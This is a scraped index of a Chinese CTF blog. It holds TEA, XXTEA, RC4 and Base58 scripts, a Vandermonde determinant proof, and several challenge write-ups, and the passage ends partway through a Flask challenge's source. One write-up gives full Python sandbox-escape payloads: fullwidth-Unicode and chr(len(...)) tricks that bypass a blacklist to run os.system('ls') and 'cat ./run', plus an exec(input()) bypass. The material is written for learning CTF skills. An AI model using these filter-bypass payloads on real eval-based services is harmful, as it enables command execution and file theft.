bytes_to_long() 后进行转换为 58 进制。\n在这种需要使用进制转换的编码中，需要将文本的二进制首尾相接组成一个大数，但是 C++ 又有数据宽度的限制，我也懒得重复造大数运算的轮子，故这一脚本使用 Python 书写，其中用到的“轮子”仅有 Python 大数运算与 long_to_bytes() 函数。\nBase58 编码脚本（58 进制转换脚本）：\n1from Crypto.Util.number import bytes_to_long 2 3table = \u0026#34;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\u0026#34; # 编码表 4message = input() 5strnum = bytes_to_long(message.encode()) 6cipher = \u0026#34;\u0026#34; 7 8while strnum: # 进制转换 9 tmp = strnum % 58 10 cipher = table[tmp] + cipher 11 strnum //= 58 12 13print(cipher) 根据这个脚本，我们实际上可以轻松改出一个任意进制转换或者进制转换爆破的脚本（或者说是 BaseX 编码脚本）。\n解码脚本：\n1from Crypto.Util.number import long_to_bytes 2 3table = \u0026#34;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\u0026#34; 4cipher = input() 5strnum = 0 6 7ciplen = len(cipher) 8for i in range(ciplen): 9 ind = table.index(cipher[ciplen - i - 1]) 10 strnum += ind * 58 ** i 11 12binstr = bin(strnum)[2::] 13 14strnum = int(binstr, 2) 15message = long_to_bytes(strnum) 16print(message.decode()) 特征：长得像进制转换。\n对称加密 TEA XTEA TEA 加密：\n1#include \u0026lt;iostream\u0026gt; 2 3using namespace std; 4 5const int DELTA = 0x9e3779b9;\t// DELTA 为常量，是 TEA 系列加密算法的重要常数，某些题目可能会悄悄修改这个值 6const int ROUNDS = 32; // 迭代轮数，TEA 加密是 32 轮，XTEA 加密是 64 轮，某些题目会在这里做手脚（QQ 是 16 轮） 7 8void teaencrypt(unsigned int* message, unsigned int* key, unsigned int* cipher) // 数据类型为无符号整型，下同，需要注意 9{ 10\tfor (int i = 0; i \u0026lt; 6; i += 2) // 跳出循环的条件改成明文长度 11\t{ 12\tunsigned int l = message[i], r = message[i + 1]; 13\tunsigned int k0 = key[0], k1 = key[1], k2 = key[2], k3 = key[3]; 14\tunsigned int sum = 0; 15\tfor (int j = 0; j \u0026lt; ROUNDS; j++) //核心加密算法 16\t{ 17\tl += ((r \u0026lt;\u0026lt; 4) + k0) ^ (r + sum) ^ ((r \u0026gt;\u0026gt; 5) + k1); 18\tr += ((l \u0026lt;\u0026lt; 4) + k2) ^ (l + sum) ^ ((l \u0026gt;\u0026gt; 5) + k3); 19\tsum += DELTA;\t20\t} 21 22\tcipher[i] = l; 23\tcipher[i + 1] = r; 24\t} 25} 26 27int main() 28{ 29\tunsigned int message[6] = { 0x378dc527, 0x2809af71, 0xb3371ac9, 0x647dbb8c, 0x45afddff, 0x36abd15d }; // 应当把这里替换成真正的明文，明文长度是 8 字节的倍数 30\tunsigned int key[4] = { 0xa96a5bc4, 0xac7afdb5, 0x7c8a1209, 0x350de6d0 }; // 应当把这里替换成真正的密钥 31\tunsigned int cipher[6] = { 0 }; // 将密文初始化为 0 32 33\tteaencrypt(message, key, cipher); 34\t35\tfor (int i = 0; i \u0026lt; 6; i++) // 以十六进制循环输出密文 36\t{ 37\tcout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; cipher[i] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; 38\t} 39\t40\treturn 0; 41} TEA 解密脚本就是把核心加密算法中的三行倒着写一遍：\n1#include \u0026lt;iostream\u0026gt; 2 3using namespace std; 4 5const int DELTA = 0x9e3779b9;\t// DELTA 为常量，是 TEA 系列加密算法的重要常数，某些题目可能会悄悄修改这个值 6const int ROUNDS = 32; // 迭代轮数，TEA 加密是 32 轮，XTEA 加密是 64 轮，某些题目会在这里做手脚（QQ 是 16 轮） 7 8void teaencrypt(unsigned int* message, unsigned int* key, unsigned int* cipher) // 数据类型为无符号整型，下同，需要注意 9{ 10\tfor (int i = 0; i \u0026lt; 6; i += 2) // 跳出循环的条件改成明文长度 11\t{ 12\tunsigned int l = cipher[i], r = cipher[i + 1]; 13\tunsigned int k0 = key[0], k1 = key[1], k2 = key[2], k3 = key[3]; 14\tunsigned int sum = 0xc6ef3720; // sum 是 DELTA * ROUNDS 的结果，如果 DELTA 或 ROUNDS 变化，sum 也会变化 15\tfor (int j = 0; j \u0026lt; ROUNDS; j++) //核心解密算法，就是将加密算法倒着写一遍 16\t{ 17\tsum -= DELTA; 18\tr -= ((l \u0026lt;\u0026lt; 4) + k2) ^ (l + sum) ^ ((l \u0026gt;\u0026gt; 5) + k3); 19\tl -= ((r \u0026lt;\u0026lt; 4) + k0) ^ (r + sum) ^ ((r \u0026gt;\u0026gt; 5) + k1); 20\t} 21 22\tmessage[i] = l; 23\tmessage[i + 1] = r; 24\t} 25} 26 27int main() 28{ 29\tunsigned int cipher[6] = { 0x5ff4166b, 0x49871e4e, 0x4c64aebc, 0x90a92d2f, 0x3816c22, 0x1d233ce8 }; // 应当把这里替换成真正的密文，密文长度是 8 字节的倍数 30\tunsigned int key[4] = { 0xa96a5bc4, 0xac7afdb5, 0x7c8a1209, 0x350de6d0 }; // 应当把这里替换成真正的密钥 31\tunsigned int message[6] = { 0 }; // 明文长度和密文长度相等 32 33\tteaencrypt(message, key, cipher); 34 35\tfor (int i = 0; i \u0026lt; 6; i++) // 以十六进制循环输出明文 36\t{ 37\tcout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; message[i] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; 38\t} 39 40\treturn 0; 41} XTEA 加密就是将加密迭代次数 ROUNDS 改为了 64 轮。\n特征：DELTA，以及核心算法的三行。\nXXTEA XXTEA 加密算法看起来与 TEA 加密算法截然不同：\n1#include \u0026lt;iostream\u0026gt; 2 3using namespace std; 4 5const int DELTA = 0x9e3779b9; 6 7void xxteaencrypt(unsigned int* key, unsigned int* cipher, int n) // 核心加密算法 8{ 9\tunsigned int rounds = 6 + 52 / n; // 计算加密轮数 10\tunsigned int y, z = cipher[n - 1]; 11\tunsigned int sum = 0, p, e; 12 13\twhile (rounds-- \u0026gt; 0) 14\t{ 15\tsum += DELTA; 16\te = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; 17 18\tfor (p = 0; p \u0026lt; n - 1; p++) 19\t{ 20\ty = cipher[p + 1]; 21\tz = cipher[p] += (((z \u0026gt;\u0026gt; 5 ^ y \u0026lt;\u0026lt; 2) + (y \u0026gt;\u0026gt; 3 ^ z \u0026lt;\u0026lt; 4)) ^ ((sum ^ y) + (key[(p \u0026amp; 3) ^ e] ^ z))); 22\t} 23 24\ty = cipher[0]; 25\tz = cipher[n - 1] += (((z \u0026gt;\u0026gt; 5 ^ y \u0026lt;\u0026lt; 2) + (y \u0026gt;\u0026gt; 3 ^ z \u0026lt;\u0026lt; 4)) ^ ((sum ^ y) + (key[(p \u0026amp; 3) ^ e] ^ z))); 26\t} 27} 28 29int main() 30{ 31\tunsigned int message[6] = { 0x378dc527, 0x2809af71, 0xb3371ac9, 0x647dbb8c, 0x45afddff, 0x36abd15d }; 32\tunsigned int key[4] = { 0xa96a5bc4, 0xac7afdb5, 0x7c8a1209, 0x350de6d0 }; 33\tunsigned int* cipher = message; 34\tint n = 6; // 数据块数量，用于在加密算法中计算加密轮数 35 36\txxteaencrypt(key, cipher, n); 37 38\tfor (int i = 0; i \u0026lt; 6; i++) 39\t{ 40\tcout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; cipher[i] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; 41\t} 42 43\treturn 0; 44} 解密脚本：\n1#include \u0026lt;iostream\u0026gt; 2 3using namespace std; 4 5const int DELTA = 0x9e3779b9; 6 7void xxteadecrypt(unsigned int* key, unsigned int* message, int n) 8{ 9\tunsigned int rounds = 6 + 52 / n; // 计算加密轮数 10\tunsigned int y = message[0], z; 11\tunsigned int sum = rounds * DELTA, p, e; 12 13\twhile (rounds-- \u0026gt; 0) 14\t{ 15\te = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; 16 17\tfor (p = n - 1; p \u0026gt; 0; p--) 18\t{ 19\tz = message[p - 1]; 20\ty = message[p] -= (((z \u0026gt;\u0026gt; 5 ^ y \u0026lt;\u0026lt; 2) + (y \u0026gt;\u0026gt; 3 ^ z \u0026lt;\u0026lt; 4)) ^ ((sum ^ y) + (key[(p \u0026amp; 3) ^ e] ^ z))); 21\t} 22 23\tz = message[n - 1]; 24\ty = message[0] -= (((z \u0026gt;\u0026gt; 5 ^ y \u0026lt;\u0026lt; 2) + (y \u0026gt;\u0026gt; 3 ^ z \u0026lt;\u0026lt; 4)) ^ ((sum ^ y) + (key[(p \u0026amp; 3) ^ e] ^ z))); 25\tsum -= DELTA; 26\t} 27} 28 29int main() 30{ 31\tunsigned int cipher[6] = { 0xbe061ed4, 0x84afc0b0, 0xd533f957, 0xf12e35ab, 0xd5dd1f5e, 0xc0e97f4b }; 32\tunsigned int key[4] = { 0xa96a5bc4, 0xac7afdb5, 0x7c8a1209, 0x350de6d0 }; 33\tunsigned int* message = cipher; 34\tint n = 6; 35 36\txxteadecrypt(key, message, n); // 在发明者给出的脚本中，n 的正负决定程序执行加密还是解密，n 为正时加密，n 为负时解密，但是解密算法里实际使用到 n 的时候依然要使用正数 37 38\tfor (int i = 0; i \u0026lt; n; i++) 39\t{ 40\tcout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; message[i] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; 41\t} 42 43\treturn 0; 44} RC4 RC4 加密有一个非常显著的特点，就是加密和解密可以用同一段代码实现。类似于 ROT13，把 RC4 加密得到的密文使用相同的密码再加密一遍，就可以得到明文。理论上讲，如果在题目里遇到了 RC4 加密，可以把密文塞回程序再跑一边，明文就自己出来了。\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;iomanip\u0026gt; 3 4using namespace std; 5 6void swap(int\u0026amp; a, int\u0026amp; b) 7{ 8 int tmp = a; 9 a = b; 10 b = tmp; 11} 12 13void init(int* S, int* T, string key) 14{ 15 int keylen = key.length(); 16 17 for (int j = 0; j \u0026lt; 256; j++) // 初始化 S 盒、T 表 18 { 19 S[j] = j; 20 T[j] = key[j % keylen]; 21 } 22} 23 24void KSA(int* S, int* T) 25{ 26 int j = 0; 27 for (int i = 0; i \u0026lt; 256; i++) 28 { 29 j = (j + S[i] + T[i]) % 256; 30 swap(S[i], S[j]); 31 } 32} 33 34void PRGA(int* S, int* D, string message) 35{ 36 int i = 0, j = 0, t; 37 for (int h = 0; h \u0026lt; message.length(); h++) 38 { 39 i = (i + 1) % 256; 40 j = (j + S[i]) % 256; 41 swap(S[i], S[j]); // 生成伪随机 42 t = (S[i] + S[j]) % 256; 43 D[h] = S[t] ^ message[h]; 44 } 45} 46 47int main() 48{ 49 string message, key; 50 int S[256] = { 0 }, T[256] = { 0 }, D[256] = { 0 }; 51 cin \u0026gt;\u0026gt; message; 52 cin \u0026gt;\u0026gt; key; 53 54 init(S, T, key); 55 KSA(S, T); 56 PRGA(S, D, message); 57 58 for (int i = 0; i \u0026lt; message.length(); i++) 59 { 60 printf(\u0026#34;%02x \u0026#34;, D[i]); // 输出两位十六进制数 61 } 62 63 return 0; 64} 这里是一个加密脚本，因此使用 cin 输入数据。\n特征：分为两部分操作，KSA（生成密钥流）与 PRGA（生成伪随机）。\n","link":"https://jackgdn.github.io/post/%E8%84%9A%E6%9C%AC%E5%BA%93/","section":"post","tags":["Reverse","C++","Python"],"title":"逆向相关算法脚本（暂时停更）"},{"body":"","link":"https://jackgdn.github.io/tags/crypto/","section":"tags","tags":null,"title":"Crypto"},{"body":"","link":"https://jackgdn.github.io/tags/wp/","section":"tags","tags":null,"title":"WP"},{"body":"","link":"https://jackgdn.github.io/categories/wp/","section":"categories","tags":null,"title":"WP"},{"body":"范德蒙德行列式：\n$$ \\begin{vmatrix}1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\\\ x_1 \u0026amp; x_2 \u0026amp; \\cdots \u0026amp; x_n \\\\ x_1^2 \u0026amp; x_2^2 \u0026amp; \\cdots \u0026amp; x_n^2 \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ x_1^{n-1} \u0026amp; x_2^{n-1} \u0026amp; \\cdots \u0026amp; x_n^{n-1} \\end{vmatrix} = \\prod_{n \\ge i \u0026gt; j \\ge 1}(x_i-x_j) $$\n证明如下：\n从第 $n$ 行开始，将行列式中的后一行减去前一行的 $x_1$ 倍，得到下式：\n$$ \\begin{vmatrix} 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\\\ 0 \u0026amp; x_2-x_1 \u0026amp; \\cdots \u0026amp; x_n-x_1 \\\\ 0 \u0026amp; x_2(x_2-x_1) \u0026amp; \\cdots \u0026amp; x_n(x_n-x_1) \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ 0 \u0026amp; x_2^{n-2}(x_2-x_1) \u0026amp; \\cdots \u0026amp; x_n^{n-2}(x_n-x_1) \\end{vmatrix}\\\\ \\ \\\\ \\ \\\\ = \\begin{vmatrix} 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\\\ 0 \u0026amp; x_2-x_1 \u0026amp; \\cdots \u0026amp; x_n-x_1 \\\\ 0 \u0026amp; x_2(x_2-x_1) \u0026amp; \\cdots \u0026amp; x_n(x_n-x_1) \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ 0 \u0026amp; x_2^{n-2}(x_2-x_1) \u0026amp; \\cdots \u0026amp; x_n^{n-2}(x_n-x_1) \\end{vmatrix} $$\n将得到的行列式按第 $1$ 行展开，得到\n$$ \\begin{vmatrix} x_2-x_1 \u0026amp; x_3-x_1 \u0026amp; \\cdots \u0026amp; x_n-x_1 \\\\ x_2(x_2-x_1) \u0026amp; x_3(x_3-x_1) \u0026amp; \\cdots \u0026amp; x_n(x_n-x_1) \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ x_2^{n-2}(x_2-x_1) \u0026amp; x_3^{n-2}(x_3-x_1) \u0026amp; \\cdots \u0026amp; x_n^{n-2}(x_n-x_1) \\end{vmatrix} \\\\ \\ \\\\ \\ \\\\ = (x_2-x_1)(x_3-x_1) \\cdots (x_n-x_1) \\begin{vmatrix} 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\\\ x_2 \u0026amp; x_3 \u0026amp; \\cdots \u0026amp; x_n \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ x_2^{n-2} \u0026amp; x_3^{n-2} \u0026amp; \\cdots \u0026amp; x_n^{n-2} \\end{vmatrix} $$\n此时该式右端为一个 $n-1$ 阶的范德蒙德行列式，可以写成：\n$$ (x_3-x_2)(x_4-x_2) \\cdots (x_n-x_2) \\begin{vmatrix} 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\\\ x_3 \u0026amp; x_4 \u0026amp; \\cdots \u0026amp; x_n \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ x_3^{n-3} \u0026amp; x_4^{n-3} \u0026amp; \\cdots \u0026amp; x_3^{n-3} \\end{vmatrix} $$\n根据数学归纳法，可以把范德蒙德行列式写作：\n$$ (x_2-x_1)(x_3-x_1) \\cdots (x_n-x_1)(x_3-x_2)(x_4-x_2) \\cdots (x_n-x_{n-1}) \\\\ \\ \\\\ \\ \\\\ = \\prod_{n \\ge i \u0026gt; j \\ge 1}(x_i-x_j) $$\n证毕。\n","link":"https://jackgdn.github.io/post/%E8%8C%83%E5%BE%B7%E8%92%99%E5%BE%B7%E8%A1%8C%E5%88%97%E5%BC%8F%E8%AF%81%E6%98%8E/","section":"post","tags":["线性代数","数学"],"title":"范德蒙德行列式证明"},{"body":"[SWPU2019] ReverseMe 乍一看 main() 函数里没有什么东西。切到反汇编界面，我们看到了一位老朋友——SEH。\n通过使用“广撒网”的打断点方式（在每一个可疑的 call 指令打断点），找到输入函数的位置：\n紧接着下面就对输入内容的长度进行判定，输入内容的长度为 0x20。\n继续调试，可以看到输入的内容在下面位置进行了异或操作：\n最后在下面与密文进行比较：\n根据此操作的特点，流程图模式中指向自己的代码块更可能是执行加密算法的部分。\n提取数据后使用脚本解密：\n1k1 = \u0026#39;SWPU_2019_CTF\u0026#39; 2k2 = [ 3 0x86, 0x0C, 0x3E, 0xCA, 0x98, 0xD7, 0xAE, 0x19, 0xE2, 0x77, 4 0x6B, 0xA6, 0x6A, 0xA1, 0x77, 0xB0, 0x69, 0x91, 0x37, 0x05, 5 0x7A, 0xF9, 0x7B, 0x30, 0x43, 0x5A, 0x4B, 0x10, 0x86, 0x7D, 6 0xD4, 0x28 7] 8k3 = [ 9 0xB3, 0x37, 0x0F, 0xF8, 0xBC, 0xBC, 0xAE, 0x5D, 0xBA, 0x5A, 10 0x4D, 0x86, 0x44, 0x97, 0x62, 0xD3, 0x4F, 0xBA, 0x24, 0x16, 11 0x0B, 0x9F, 0x72, 0x1A, 0x65, 0x68, 0x6D, 0x26, 0xBA, 0x6B, 12 0xC8, 0x67 13] 14 15for i in range(0x20): 16 print(chr(ord(k1[i % 13]) ^ k2[i] ^ k3[i]), end = \u0026#39;\u0026#39;) 17 18# output: flag{Y0uaretheB3st!#@_VirtualCC} buuctf - rsa 不是很懂，为什么一道 RSA 被放到了逆向里。\n题目附件中有两个文件： pub.key 和 flag.enc。\n万事俱备，直接解：\n1from Crypto.PublicKey import RSA 2 3with open(\u0026#39;pub.key\u0026#39;, \u0026#39;r\u0026#39;) as pubkey: 4 key = RSA.importKey(pubkey.read()) 5 6print(key.n) 7 8# output: 86934482296048119190666062003494800588905656017203025617216654058378322103517 上面的脚本从 pub.key 中读取出了 n，分解后可以解出 flag：\n1from Crypto.Util.number import * 2import gmpy2 3 4n = 86934482296048119190666062003494800588905656017203025617216654058378322103517 5p = 285960468890451637935629440372639283459 6q = 304008741604601924494328155975272418463 7e = 65537 8 9phi = (p - 1) * (q - 1) 10d = gmpy2.invert(e, phi) 11 12with open(\u0026#39;flag.enc\u0026#39;, \u0026#39;rb\u0026#39;) as flag: 13 c = bytes_to_long(flag.read()) 14 15m = pow(c, d, n) 16print(long_to_bytes(m)) 17 18# output: b\u0026#39;\\x02\\x9d {zR\\x1e\\x08\\xe4\\xe6\\x18\\x06\\x00flag{decrypt_256}\\n\u0026#39; [QCTF2018] Xman-babymips 题目唯一亮点在于它是 MIPS 架构汇编，不过用 IDA 7.7 照样可以反编译。\n核心代码：\n1int __fastcall main(int a1, char **a2, char **a3) 2{ 3 int i; // [sp+18h] [+18h] BYREF 4 char v5[36]; // [sp+1Ch] [+1Ch] BYREF 5 6 setbuf(stdout, 0); 7 setbuf(stdin, 0); 8 printf(\u0026#34;Give me your flag:\u0026#34;); 9 scanf(\u0026#34;%32s\u0026#34;, v5); 10 for ( i = 0; i \u0026lt; 32; ++i ) 11 v5[i] ^= 32 - i; 12 if ( !strncmp(v5, fdata, 5u) ) 13 return sub_4007F0(v5); 14 else 15 return puts(\u0026#34;Wrong\u0026#34;); 16} 17 18int __fastcall sub_4007F0(const char *a1) 19{ 20 char v1; // $v1 21 size_t i; // [sp+18h] [+18h] 22 23 for ( i = 5; i \u0026lt; strlen(a1); ++i ) 24 { 25 if ( (i \u0026amp; 1) != 0 ) 26 v1 = (a1[i] \u0026gt;\u0026gt; 2) | (a1[i] \u0026lt;\u0026lt; 6); 27 else 28 v1 = (4 * a1[i]) | (a1[i] \u0026gt;\u0026gt; 6); 29 a1[i] = v1; 30 } 31 if ( !strncmp(a1 + 5, off_410D04, 0x1Bu) ) 32 return puts(\u0026#34;Right!\u0026#34;); 33 else 34 return puts(\u0026#34;Wrong!\u0026#34;); 35} 我 NT 了，竟然在这道题上卡住，主要是脚本写的有问题。正确脚本如下：\n1c = [ 2 0x51, 0x7C, 0x6A, 0x7B, 0x67, 0x52, 0xFD, 3 0x16, 0xA4, 0x89, 0xBD, 0x92, 0x80, 0x13, 0x41, 0x54, 0xA0, 4 0x8D, 0x45, 0x18, 0x81, 0xDE, 0xFC, 0x95, 0xF0, 0x16, 0x79, 5 0x1A, 0x15, 0x5B, 0x75, 0x1F 6] 7 8for i in range(5, 32): 9 if i % 2 == 0: 10 c[i] = (c[i] \u0026gt;\u0026gt; 2 | c[i] \u0026lt;\u0026lt; 6) \u0026amp; 0x7F 11 else: 12 c[i] = (c[i] \u0026lt;\u0026lt; 2 | c[i] \u0026gt;\u0026gt; 6) \u0026amp; 0x7F 13 14for i in range(32): 15 print(chr(c[i] ^ 32 - i), end = \u0026#39;\u0026#39;) 16 17# output: qctf{ReA11y_4_B@89_mlp5_4_XmAn_} [WMCTF2020] easy_re 这道题的程序使用 Perl 语言编写，随后通过 ActivePerl 将代码打包成可执行文件。运行程序，程序会输出 \u0026quot;please input the flag:\u0026quot; 提示输入 flag。但是在 IDA 中搜索字符串，无法找到相应字符串。\n根据已知的信息，Perl 语言在打包成可执行文件时，会将解释器、编译器与压缩后的代码一同装进可执行文件中。在执行时，程序会首先初始化编译器，随后解压代码并执行代码。在执行源代码，程序会向栈内压入一个字符串 \u0026quot;script\u0026quot; 用于标记。因此搜索字符串 \u0026quot;script\u0026quot; 并定位到这里。\n上图中 sub_40D1A0() 是解压 Perl 脚本的部分，解压完成后原始 Perl 脚本地址会存储在 rax 寄存器中。\n经调试可以得到原始 Perl 脚本：\n1$flag = \u0026#34;WMCTF{I_WAnt_dynam1c_F1ag}\u0026#34;; 2print \u0026#34;please input the flag:\u0026#34;; 3$line = \u0026lt;STDIN\u0026gt;; 4chomp($line); 5if($line eq $flag){ 6\tprint \u0026#34;congratulation!\u0026#34; 7}else{ 8\tprint \u0026#34;no,wrong\u0026#34; 9} flag 一目了然。\n","link":"https://jackgdn.github.io/post/%E8%BF%91%E6%9C%9F%E8%A7%A3%E9%A2%98_20240314/","section":"post","tags":["Reverse","Crypto","WP"],"title":"近期解题 2024.3.14"},{"body":"","link":"https://jackgdn.github.io/tags/%E6%95%B0%E5%AD%A6/","section":"tags","tags":null,"title":"数学"},{"body":"","link":"https://jackgdn.github.io/categories/%E6%95%B0%E5%AD%A6/","section":"categories","tags":null,"title":"数学"},{"body":"","link":"https://jackgdn.github.io/tags/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/","section":"tags","tags":null,"title":"线性代数"},{"body":"","link":"https://jackgdn.github.io/tags/forensics/","section":"tags","tags":null,"title":"Forensics"},{"body":"","link":"https://jackgdn.github.io/tags/misc/","section":"tags","tags":null,"title":"Misc"},{"body":"I am so vegetable 我太菜了 :-(\nb4by_jail 一道简单的 Python 沙箱逃逸（指连我都会做），题目附件如下：\n1#!/usr/local/bin/python 2import time 3flag=\u0026#34;pearl{f4k3_fl4g}\u0026#34; 4blacklist=list(\u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~`![]{},\u0026lt;\u0026gt;/123456789\u0026#34;) 5def banner(): 6 file=open(\u0026#34;txt.txt\u0026#34;,\u0026#34;r\u0026#34;).read() 7 print(file) 8def check_blocklist(string): 9 for i in string: 10 if i in blacklist: 11 return(0) 12 return(1) 13def main(): 14 banner() 15 cmd=input(\u0026#34;\u0026gt;\u0026gt;\u0026gt; \u0026#34;) 16 time.sleep(1) 17 if(check_blocklist(cmd)): 18 try: 19 print(eval(cmd)) 20 except: 21 print(\u0026#34;Sorry no valid output to show.\u0026#34;) 22 else: 23 print(\u0026#34;Your sentence has been increased by 2 years for attempted escape.\u0026#34;) 24 25main() 所有的字母都被屏蔽，部分符号被屏蔽，数字仅 0 可用，因此想到使用 Unicode 特殊字符绕过。把 __import__('os').system('ls') 的全部字母都换成全角字符：\n1\u0026gt;\u0026gt;\u0026gt; __ｉｍｐｏｒｔ__(\u0026#39;ｏｓ\u0026#39;).ｓｙｓｔｅｍ(\u0026#39;ｌｓ\u0026#39;) 2Traceback (most recent call last): 3 File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; 4ModuleNotFoundError: No module named \u0026#39;ｏｓ\u0026#39; 根据 web 师傅的经验，在进行 SSTI 注入时，模块名只能使用原字符。同时由于 Linux 操作系统的限制，os.system() 中的指令也只能使用原字符。因此我们使用下面的方法作为修改过的载荷：\n1__ｉｍｐｏｒｔ__(ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;))).ｓｙｓｔｅｍ(ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;))) 其中的 “os” 与 “ls” 都使用 0 的数量表示，最终拼凑出来的是原字符。通过这个载荷可以看到 flag 所在的文件：./run。随后将载荷中的 “ls” 改为 “cat ./run” 得到 flag。修改后的载荷如下：\n1__ｉｍｐｏｒｔ__(ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;))).ｓｙｓｔｅｍ(ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;))) 修改载荷的脚本（用于将字符使用 0 的数量表示）：\n1d = \u0026#34;cat ./run\u0026#34; 2s = \u0026#39;\u0026#39; 3for i in d: 4 s += \u0026#34;ｃｈｒ(ｌｅｎ(\u0026#39;\u0026#34; 5 s += ord(i) * \u0026#39;0\u0026#39; 6 s += \u0026#34;\u0026#39;)) + \u0026#34; 7print(s[:-3]) 8 9# output: ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) 除了这一种方法，还可以使用 ｅｘｅｃ(ｉｎｐｕｔ()) 作为攻击载荷，这样程序就会执行我们在下一行输入的代码而不进行字符检测，因此后面就可以直接输入 __import__('os').system('ls') 以及 __import__('os').system('cat ./run') 得到 flag。\nTooRandom 能解出这道题就是 too random。下面是题目源码：\n1from flask import Flask 2from flask import render_template 3from flask import redirect 4from flask import request 5 6import random 7 8app = Flask(__name__) 9app.secret_key = \u0026#34;secret_key\u0026#34; 10 11seed = random.getrandbits(32) 12random.seed(seed) 13flag_no = None 14 15def 